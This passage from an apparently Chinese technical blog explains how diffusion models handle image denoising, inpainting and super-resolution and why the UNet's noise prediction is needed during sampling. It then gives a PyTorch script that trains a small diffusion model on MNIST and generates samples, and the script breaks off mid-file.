<h4 id="1-图像去噪"><a href="#1-图像去噪" class="headerlink" title="(1) 图像去噪"></a><strong>(1) 图像去噪</strong></h4><p>假设输入一张含噪图像 (x_{\text{noisy}})，目标是恢复清晰图像：</p>
<ol>
<li><strong>初始化</strong>：将 (x_{\text{noisy}}) 作为初始状态 (x_T)（跳过前向过程）。</li>
<li><strong>反向去噪</strong>：通过扩散模型的去噪步骤逐步优化：<br>[<br>x_{t-1} &#x3D; \frac{1}{\sqrt{\alpha_t}} \left( x_t - \frac{\beta_t}{\sqrt{1 - \bar{\alpha}<em>t}} \cdot \epsilon</em>\theta(x_t, t) \right) + \sqrt{\beta_t} \cdot \epsilon<br>]<br>其中，(\epsilon_\theta) 是模型预测的噪声，(\epsilon) 是额外添加的噪声（可选）。</li>
<li><strong>结果</strong>：最终得到去噪后的图像 (x_0)。</li>
</ol>
<h4 id="2-图像修复（Inpainting）"><a href="#2-图像修复（Inpainting）" class="headerlink" title="(2) 图像修复（Inpainting）"></a><strong>(2) 图像修复（Inpainting）</strong></h4><p>修复图像中缺失或损坏的区域：</p>
<ol>
<li><strong>掩码输入</strong>：将损坏区域标记为掩码（mask），输入模型时仅保留可见区域。</li>
<li><strong>条件扩散</strong>：在每一步去噪时，仅更新掩码区域，固定可见区域：<br>[<br>x_{t-1}^{\text{masked}} &#x3D; \frac{1}{\sqrt{\alpha_t}} \left( x_t^{\text{masked}} - \frac{\beta_t}{\sqrt{1 - \bar{\alpha}<em>t}} \cdot \epsilon</em>\theta(x_t^{\text{masked}}, t) \right)<br>]<br>其中，(x_t^{\text{masked}}) 是掩码区域的当前状态。</li>
</ol>
<h4 id="3-超分辨率（Super-Resolution）"><a href="#3-超分辨率（Super-Resolution）" class="headerlink" title="(3) 超分辨率（Super-Resolution）"></a><strong>(3) 超分辨率（Super-Resolution）</strong></h4><p>将低分辨率图像 (x_{\text{LR}}) 转换为高分辨率 (x_{\text{HR}})：</p>
<ol>
<li><strong>上采样</strong>：将 (x_{\text{LR}}) 上采样到目标分辨率（如双线性插值）。</li>
<li><strong>扩散优化</strong>：将上采样后的图像作为初始输入，通过扩散模型细化细节：<br>[<br>x_{t-1} &#x3D; \text{Diffusion}(x_t, t) \quad \text{with} \quad x_T &#x3D; \text{Upsampled}(x_{\text{LR}})<br>]</li>
</ol>
<hr>
<h3 id="4-关键挑战与解决方案"><a href="#4-关键挑战与解决方案" class="headerlink" title="4. 关键挑战与解决方案"></a><strong>4. 关键挑战与解决方案</strong></h3><h4 id="1-任务适配性不足"><a href="#1-任务适配性不足" class="headerlink" title="(1) 任务适配性不足"></a><strong>(1) 任务适配性不足</strong></h4><ul>
<li><strong>问题</strong>：模型未针对特定任务（如去噪）优化，可能导致结果不理想。</li>
<li><strong>解决方案</strong>：<ul>
<li><strong>引导扩散（Guided Diffusion）</strong>：通过条件输入（如文本描述、掩码）引导生成方向。</li>
<li><strong>微调模型</strong>：在特定任务数据上微调模型参数。</li>
</ul>
</li>
</ul>
<h4 id="2-计算效率"><a href="#2-计算效率" class="headerlink" title="(2) 计算效率"></a><strong>(2) 计算效率</strong></h4><ul>
<li><strong>问题</strong>：扩散模型的生成过程需要 (T) 步迭代（如 (T&#x3D;1000)），计算成本高。</li>
<li><strong>解决方案</strong>：<ul>
<li><strong>快速采样技术</strong>：如DDIM（去除了部分噪声项，加速生成）。</li>
<li><strong>中间步骤截断</strong>：仅运行部分步骤（如 (T&#x3D;50)）以平衡速度与质量。</li>
</ul>
</li>
</ul>
<h4 id="3-数据分布偏差"><a href="#3-数据分布偏差" class="headerlink" title="(3) 数据分布偏差"></a><strong>(3) 数据分布偏差</strong></h4><ul>
<li><strong>问题</strong>：模型可能对训练数据外的输入（如极端噪声、特殊风格）表现不佳。</li>
<li><strong>解决方案</strong>：<ul>
<li><strong>数据增强</strong>：在训练时加入更多噪声类型或风格的数据。</li>
<li><strong>领域适应（Domain Adaptation）</strong>：针对特定领域微调模型。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="5-实际应用案例"><a href="#5-实际应用案例" class="headerlink" title="5. 实际应用案例"></a><strong>5. 实际应用案例</strong></h3><h4 id="1-Stable-Diffusion的图像修复"><a href="#1-Stable-Diffusion的图像修复" class="headerlink" title="(1) Stable Diffusion的图像修复"></a><strong>(1) Stable Diffusion的图像修复</strong></h4><p>Stable Diffusion支持通过<strong>掩码和提示文本</strong>进行图像修复：</p>
<ul>
<li>输入：损坏的图像 + 掩码（标记损坏区域） + 文本描述（如“修复天空”）。</li>
<li>输出：根据文本提示修复后的图像。</li>
</ul>
<h4 id="2-风格迁移"><a href="#2-风格迁移" class="headerlink" title="(2) 风格迁移"></a><strong>(2) 风格迁移</strong></h4><p>通过调整扩散过程的条件输入（如风格图像或文本描述），将输入图像转换为特定风格。</p>
<h4 id="3-医学图像去噪"><a href="#3-医学图像去噪" class="headerlink" title="(3) 医学图像去噪"></a><strong>(3) 医学图像去噪</strong></h4><p>在医疗领域，研究者已尝试使用扩散模型去噪MRI或CT图像，但需在医疗数据上微调模型。</p>
<hr>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a><strong>6. 总结</strong></h3><ul>
<li><strong>直接使用可行性</strong>：是的，扩散模型可以通过调整推理流程（如引导采样、掩码条件）对现有图像进行修复、去噪等操作。</li>
<li><strong>效果与限制</strong>：效果取决于模型训练数据与任务的匹配度，以及是否进行针对性调整（如微调、引导）。</li>
<li><strong>替代方案</strong>：对于特定任务（如去噪），传统方法（如DnCNN、Wavelet去噪）可能更高效，但扩散模型在复杂场景（如风格化修复）中更具优势。</li>
</ul>
<p>因此，扩散模型在图像处理中的应用需要结合任务需求和模型特性，通过灵活调整推理流程或微调参数来实现目标。</p>
<h2 id="unet网络预测的噪声是要逼近前向过程自己产生的随机噪声，那是否直接用这个前向噪声就可以直接Sampling，倘若可以，那扩散模型的意义是啥嘞"><a href="#unet网络预测的噪声是要逼近前向过程自己产生的随机噪声，那是否直接用这个前向噪声就可以直接Sampling，倘若可以，那扩散模型的意义是啥嘞" class="headerlink" title="unet网络预测的噪声是要逼近前向过程自己产生的随机噪声，那是否直接用这个前向噪声就可以直接Sampling，倘若可以，那扩散模型的意义是啥嘞"></a>unet网络预测的噪声是要逼近前向过程自己产生的随机噪声，那是否直接用这个前向噪声就可以直接Sampling，倘若可以，那扩散模型的意义是啥嘞</h2><p>你的问题触及扩散模型的核心机制，需要从<strong>数学推导</strong>和<strong>模型目标</strong>两个层面澄清。以下是详细解释：</p>
<hr>
<h3 id="1-前向噪声与UNet预测噪声的关系"><a href="#1-前向噪声与UNet预测噪声的关系" class="headerlink" title="1. 前向噪声与UNet预测噪声的关系"></a><strong>1. 前向噪声与UNet预测噪声的关系</strong></h3><h4 id="1-前向过程的噪声是随机的"><a href="#1-前向过程的噪声是随机的" class="headerlink" title="(1) 前向过程的噪声是随机的"></a><strong>(1) 前向过程的噪声是随机的</strong></h4><p>在前向过程中，每个时间步 (t) 添加的噪声 (\epsilon_t) 是<strong>独立的随机变量</strong>，满足：<br>[<br>\epsilon_t \sim \mathcal{N}(0, I)<br>]<br>这些噪声是随机生成的，且<strong>无法在生成阶段（反向过程）中直接访问</strong>。例如，当你在生成阶段从噪声 (x_T) 开始时，你并不知道 (x_T) 是由哪些随机噪声 (\epsilon_1, \epsilon_2, \dots, \epsilon_T) 生成的。</p>
<h4 id="2-UNet的预测目标"><a href="#2-UNet的预测目标" class="headerlink" title="(2) UNet的预测目标"></a><strong>(2) UNet的预测目标</strong></h4><p>UNet的训练目标是<strong>学习如何根据当前噪声样本 (x_t) 和时间步 (t)，预测出前向过程中添加的噪声 (\epsilon_t)</strong>。具体来说：</p>
<ul>
<li><strong>训练阶段</strong>：对于真实数据 (x_0)，通过前向过程生成 (x_t)，并记录对应的噪声 (\epsilon)（因为训练时可以访问所有中间步骤）。</li>
<li><strong>损失函数</strong>：模型通过最小化预测噪声 (\epsilon_\theta(x_t, t)) 与真实噪声 (\epsilon) 的差异来训练：<br>[<br>\mathbb{E}<em>{x_0, \epsilon, t} \left[ || \epsilon - \epsilon</em>\theta(x_t, t) ||^2 \right]<br>]</li>
<li><strong>生成阶段</strong>：模型无法直接访问前向过程的噪声 (\epsilon_t)，但可以通过预测的噪声 (\epsilon_\theta(x_t, t)) 来<strong>逆向计算去噪步骤</strong>。</li>
</ul>
<hr>
<h3 id="2-为什么不能直接使用前向噪声进行采样？"><a href="#2-为什么不能直接使用前向噪声进行采样？" class="headerlink" title="2. 为什么不能直接使用前向噪声进行采样？"></a><strong>2. 为什么不能直接使用前向噪声进行采样？</strong></h3><h4 id="1-前向噪声是随机且不可逆的"><a href="#1-前向噪声是随机且不可逆的" class="headerlink" title="(1) 前向噪声是随机且不可逆的"></a><strong>(1) 前向噪声是随机且不可逆的</strong></h4><ul>
<li><strong>不可逆性</strong>：前向过程是一个马尔可夫链，每一步的噪声 (\epsilon_t) 是随机且独立的。例如，从 (x_0) 到 (x_T) 的路径是<strong>无数可能的噪声序列</strong>中的一种，而生成阶段无法知道具体用了哪一条路径。</li>
<li><strong>逆向过程需要噪声的估计</strong>：在反向过程中，计算 (x_{t-1}) 时需要知道当前噪声 (x_t) 和<strong>前向过程中添加的噪声 (\epsilon_t)</strong>。如果不知道 (\epsilon_t)，就无法逆向计算 (x_{t-1})。</li>
</ul>
<h4 id="2-生成阶段的数学推导依赖UNet的预测"><a href="#2-生成阶段的数学推导依赖UNet的预测" class="headerlink" title="(2) 生成阶段的数学推导依赖UNet的预测"></a><strong>(2) 生成阶段的数学推导依赖UNet的预测</strong></h4><p>反向过程的核心公式为：<br>[<br>x_{t-1} &#x3D; \frac{1}{\sqrt{\alpha_t}} \left( x_t - \frac{\beta_t}{\sqrt{1 - \bar{\alpha}<em>t}} \cdot \epsilon</em>\theta(x_t, t) \right) + \sqrt{\beta_t} \cdot \epsilon<br>]<br>其中：</p>
<ul>
<li>(\epsilon_\theta(x_t, t)) 是UNet预测的噪声（对前向噪声 (\epsilon_t) 的估计）。</li>
<li>(\epsilon) 是在反向过程中新添加的噪声（用于探索可能性）。</li>
</ul>
<p><strong>关键点</strong>：</p>
<ul>
<li>如果没有UNet，我们无法知道 (\epsilon_t)，因此无法计算 (x_{t-1}) 的值。</li>
<li><strong>直接使用前向噪声</strong>需要知道所有 (\epsilon_t)，但生成阶段无法获取这些噪声，因此无法实现。</li>
</ul>
<hr>
<h3 id="3-扩散模型的意义"><a href="#3-扩散模型的意义" class="headerlink" title="3. 扩散模型的意义"></a><strong>3. 扩散模型的意义</strong></h3><h4 id="1-学习数据分布的隐式表达"><a href="#1-学习数据分布的隐式表达" class="headerlink" title="(1) 学习数据分布的隐式表达"></a><strong>(1) 学习数据分布的隐式表达</strong></h4><p>扩散模型的核心意义在于：</p>
<ul>
<li><strong>通过UNet学习数据分布的统计特性</strong>：模型通过预测噪声 (\epsilon_t)，间接学习了如何从噪声中恢复数据分布。例如，在图像生成中，模型学会了如何从模糊的噪声中逐步恢复出清晰的图像结构。</li>
<li><strong>渐进式去噪的数学框架</strong>：扩散模型通过固定前向过程的噪声路径，将生成任务分解为<strong>多个小步骤的去噪问题</strong>，避免了直接从噪声到数据的一步跳跃（这在高维空间中几乎不可能）。</li>
</ul>
<h4 id="2-解决传统生成模型的局限性"><a href="#2-解决传统生成模型的局限性" class="headerlink" title="(2) 解决传统生成模型的局限性"></a><strong>(2) 解决传统生成模型的局限性</strong></h4><ul>
<li><strong>与GAN的对比</strong>：GAN通过对抗训练生成样本，但容易出现模式崩溃或训练不稳定。扩散模型通过<strong>明确的数学公式</strong>（如反向过程的去噪步骤）确保生成过程的稳定性。</li>
<li><strong>与VAE的对比</strong>：VAE受限于编码器-解码器结构，可能丢失信息。扩散模型通过多步去噪逐步恢复细节，生成质量更高。</li>
</ul>
<h4 id="3-生成高质量样本的能力"><a href="#3-生成高质量样本的能力" class="headerlink" title="(3) 生成高质量样本的能力"></a><strong>(3) 生成高质量样本的能力</strong></h4><p>扩散模型的生成质量依赖于UNet的预测能力：</p>
<ul>
<li><strong>每一步的微调</strong>：UNet在每个时间步 (t) 都能根据当前噪声样本 (x_t) 的局部信息，预测出正确的去噪方向。</li>
<li><strong>噪声的可控性</strong>：通过调整反向过程中的新噪声 (\epsilon)，可以在生成过程中平衡确定性（如固定种子）和多样性（如随机噪声）。</li>
</ul>
<hr>
<h3 id="4-如果没有UNet会发生什么？"><a href="#4-如果没有UNet会发生什么？" class="headerlink" title="4. 如果没有UNet会发生什么？"></a><strong>4. 如果没有UNet会发生什么？</strong></h3><p>假设直接使用前向噪声进行生成（即没有UNet），则：</p>
<ul>
<li><strong>无法逆向计算</strong>：因为前向噪声 (\epsilon_t) 是未知的，反向过程无法执行去噪步骤。</li>
<li><strong>生成结果退化</strong>：只能通过随机猜测噪声，导致生成的样本完全随机，无法形成有意义的结构。</li>
</ul>
<hr>
<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a><strong>5. 总结</strong></h3><ul>
<li><strong>UNet的不可替代性</strong>：扩散模型的反向过程<strong>必须依赖UNet的预测噪声</strong>，因为前向噪声在生成阶段是未知的。</li>
<li><strong>扩散模型的意义</strong>：通过UNet学习噪声与数据的映射关系，将生成任务分解为可控制的渐进式去噪步骤，从而生成高质量样本。</li>
<li><strong>数学与工程的结合</strong>：固定前向路径提供数学可逆性，而UNet通过学习噪声分布实现数据分布的建模，两者共同构成扩散模型的核心。</li>
</ul>
<p>因此，扩散模型的意义在于<strong>通过UNet的预测能力，将随机噪声逐步转化为符合数据分布的样本</strong>，而这一过程无法通过直接使用前向噪声实现。</p>
<h2 id="wait-to-be-continued…"><a href="#wait-to-be-continued…" class="headerlink" title="wait to be continued…"></a>wait to be continued…</h2>]]></content>
      <tags>
        <tag>science</tag>
      </tags>
  </entry>
  <entry>
    <title>diffusion-model small example</title>
    <url>/2025/03/27/diffusion-model-small-example/</url>
    <content><![CDATA[<h2 id="diffusion-model-for-MNIST"><a href="#diffusion-model-for-MNIST" class="headerlink" title="diffusion-model for MNIST"></a>diffusion-model for MNIST</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> datasets, transforms, utils</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 超参数设置</span></span><br><span class="line">batch_size = <span class="number">128</span></span><br><span class="line">num_epochs = <span class="number">20</span></span><br><span class="line">timesteps = <span class="number">1000</span>  <span class="comment"># 扩散总步数</span></span><br><span class="line">beta_start = <span class="number">1e-4</span></span><br><span class="line">beta_end = <span class="number">0.02</span></span><br><span class="line">learning_rate = <span class="number">1e-3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;CUDA是否可用: <span class="subst">&#123;torch.cuda.is_available()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前GPU设备: <span class="subst">&#123;torch.cuda.get_device_name(<span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;GPU内存使用: <span class="subst">&#123;torch.cuda.memory_allocated()/<span class="number">1024</span>**<span class="number">2</span>:<span class="number">.2</span>f&#125;</span> MB&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在设备初始化后添加</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前使用的设备: <span class="subst">&#123;device&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义噪声调度（线性调度）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_beta_schedule</span>(<span class="params">timesteps, beta_start, beta_end</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.linspace(beta_start, beta_end, timesteps, device=device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预计算扩散过程的关键参数</span></span><br><span class="line">betas = linear_beta_schedule(timesteps, beta_start, beta_end)</span><br><span class="line">alphas = <span class="number">1.</span> - betas</span><br><span class="line">alphas_cumprod = torch.cumprod(alphas, dim=<span class="number">0</span>)</span><br><span class="line">sqrt_alphas_cumprod = torch.sqrt(alphas_cumprod)</span><br><span class="line">sqrt_one_minus_alphas_cumprod = torch.sqrt(<span class="number">1.</span> - alphas_cumprod)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义UNet模型（简化版）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleUNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># 增加通道数和层数</span></span><br><span class="line">        <span class="variable language_">self</span>.encoder = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>, <span class="number">64</span>, <span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">False</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, <span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">False</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.mid = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">128</span>, <span class="number">128</span>, <span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">False</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">128</span>, <span class="number">128</span>, <span class="number">3</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">False</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.decoder = nn.Sequential(</span><br><span class="line">            nn.ConvTranspose2d(<span class="number">128</span>, <span class="number">64</span>, <span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>, output_padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">False</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">1</span>, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.time_embed = nn.Embedding(timesteps, <span class="number">128</span>)  <span class="comment"># 增加嵌入维度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, t</span>):</span><br><span class="line">        <span class="comment"># 时间嵌入</span></span><br><span class="line">        t_emb = <span class="variable language_">self</span>.time_embed(t).unsqueeze(-<span class="number">1</span>).unsqueeze(-<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 编码器</span></span><br><span class="line">        x = <span class="variable language_">self</span>.encoder(x)</span><br><span class="line">        <span class="comment"># 添加时间信息 - 避免使用原地操作</span></span><br><span class="line">        x = x + t_emb  <span class="comment"># 将 x += t_emb 改为 x = x + t_emb</span></span><br><span class="line">        <span class="comment"># 中间层</span></span><br><span class="line">        x = <span class="variable language_">self</span>.mid(x)</span><br><span class="line">        <span class="comment"># 解码器</span></span><br><span class="line">        x = <span class="variable language_">self</span>.decoder(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载MNIST数据集</span></span><br><span class="line">transform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((<span class="number">0.5</span>,), (<span class="number">0.5</span>,))])</span><br><span class="line">dataset = datasets.MNIST(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">True</span>, download=<span class="literal">True</span>, transform=transform)</span><br><span class="line">dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化模型和优化器</span></span><br><span class="line">model = SimpleUNet().to(device)</span><br><span class="line"><span class="comment"># 检查模型所在设备</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;模型所在设备: <span class="subst">&#123;<span class="built_in">next</span>(model.parameters()).device&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=learning_rate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在训练循环之前添加这行代码</span></span><br><span class="line">torch.autograd.set_detect_anomaly(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练循环</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    model.train()</span><br><span class="line">    total_loss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> step, (images, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(dataloader):</span><br><span class="line">        images = images.to(device)</span><br><span class="line">        batch_size = images.shape[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 随机采样时间步</span></span><br><span class="line">        t = torch.randint(<span class="number">0</span>, timesteps, (batch_size,), device=device).long()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 前向扩散过程（加噪）</span></span><br><span class="line">        sqrt_alpha_cumprod_t = sqrt_alphas_cumprod[t].view(batch_size, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        sqrt_one_minus_alpha_cumprod_t = sqrt_one_minus_alphas_cumprod[t].view(batch_size, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        noise = torch.randn_like(images)</span><br><span class="line">        noisy_images = sqrt_alpha_cumprod_t * images + sqrt_one_minus_alpha_cumprod_t * noise</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 预测噪声</span></span><br><span class="line">        predicted_noise = model(noisy_images, t)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算损失</span></span><br><span class="line">        loss = F.mse_loss(noise, predicted_noise)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反向传播</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        </span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">        <span class="keyword">if</span> (step + <span class="number">1</span>) % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Epoch [<span class="subst">&#123;epoch+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;num_epochs&#125;</span>], Step [<span class="subst">&#123;step+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(dataloader)&#125;</span>], Loss: <span class="subst">&#123;loss.item():<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    avg_loss = total_loss / <span class="built_in">len</span>(dataloader)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Epoch <span class="subst">&#123;epoch+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;num_epochs&#125;</span>, Average Loss: <span class="subst">&#123;avg_loss:<span class="number">.4</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存模型权重</span></span><br><span class="line">model_save_path = <span class="string">&quot;diffusion_model.pth&quot;</span></span><br><span class="line">torch.save(model.state_dict(), model_save_path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;模型已保存到: <span class="subst">&#123;model_save_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成新样本（反向过程）</span></span><br><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample</span>(<span class="params">model, image_size=(<span class="params"><span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span></span>), num_samples=<span class="number">16</span>, temperature=<span class="number">0.8</span></span>):</span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    x = torch.randn(num_samples, *image_size).to(device)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(timesteps)):</span><br><span class="line">        t_tensor = torch.full((num_samples,), t, device=device, dtype=torch.long)</span><br><span class="line">        predicted_noise = model(x, t_tensor)</span><br><span class="line">        </span><br><span class="line">        alpha_t = alphas[t]</span><br><span class="line">        beta_t = betas[t]</span><br><span class="line">        sqrt_alpha_t = torch.sqrt(alpha_t)</span><br><span class="line">        sqrt_one_minus_alpha_cumprod_t = sqrt_one_minus_alphas_cumprod[t]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> t &gt; <span class="number">0</span>:</span><br><span class="line">            noise = torch.randn_like(x) * temperature  <span class="comment"># 添加温度参数控制噪声强度</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            noise = torch.zeros_like(x)</span><br><span class="line">            </span><br><span class="line">        x = (<span class="number">1</span> / sqrt_alpha_t) * (x - beta_t / sqrt_one_minus_alpha_cumprod_t * predicted_noise) + torch.sqrt(beta_t) * noise</span><br><span class="line">    </span><br><span class="line">    x = (x.clamp(-<span class="number">1</span>, <span class="number">1</span>) + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x.cpu()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_process_image</span>(<span class="params">image, threshold=<span class="number">0.5</span>, enhance_contrast=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;增强的后处理函数&quot;&quot;&quot;</span></span><br><span class="line">    processed = image.clone()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 归一化到 [0,1] 范围</span></span><br><span class="line">    processed = (processed - processed.<span class="built_in">min</span>()) / (processed.<span class="built_in">max</span>() - processed.<span class="built_in">min</span>())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> enhance_contrast:</span><br><span class="line">        <span class="comment"># 对比度增强</span></span><br><span class="line">        mean = processed.mean()</span><br><span class="line">        processed = (processed - mean) * <span class="number">1.5</span> + mean  <span class="comment"># 增加对比度</span></span><br><span class="line">        processed = processed.clamp(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 自适应阈值</span></span><br><span class="line">    local_threshold = processed.mean() + <span class="number">0.1</span></span><br><span class="line">    threshold = <span class="built_in">min</span>(<span class="built_in">max</span>(threshold, local_threshold), <span class="number">0.7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 二值化</span></span><br><span class="line">    processed = torch.where(processed &gt; threshold,</span><br><span class="line">                          torch.ones_like(processed),</span><br><span class="line">                          torch.zeros_like(processed))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> processed</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成并保存原始样本和处理后的样本</span></span><br><span class="line">generated_images = sample(model, temperature=<span class="number">0.6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个函数来保存图像网格</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_image_grid</span>(<span class="params">images, filename, title=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;保存图像网格到文件</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        images: 图像张量 [N, C, H, W]</span></span><br><span class="line"><span class="string">        filename: 保存的文件名</span></span><br><span class="line"><span class="string">        title: 图像标题</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    fig, axes = plt.subplots(<span class="number">4</span>, <span class="number">4</span>, figsize=(<span class="number">8</span>,<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">if</span> title:</span><br><span class="line">        fig.suptitle(title)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, ax <span class="keyword">in</span> <span class="built_in">enumerate</span>(axes.flatten()):</span><br><span class="line">        ax.imshow(images[i].squeeze(), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">        ax.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    plt.savefig(filename, dpi=<span class="number">300</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">    plt.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存原始生成图像</span></span><br><span class="line">save_image_grid(generated_images, <span class="string">&#x27;generated_images_raw.png&#x27;</span>, <span class="string">&#x27;original generated images&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对生成的图像进行后处理</span></span><br><span class="line">processed_images = torch.stack([post_process_image(img, threshold=<span class="number">0.5</span>) <span class="keyword">for</span> img <span class="keyword">in</span> generated_images])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 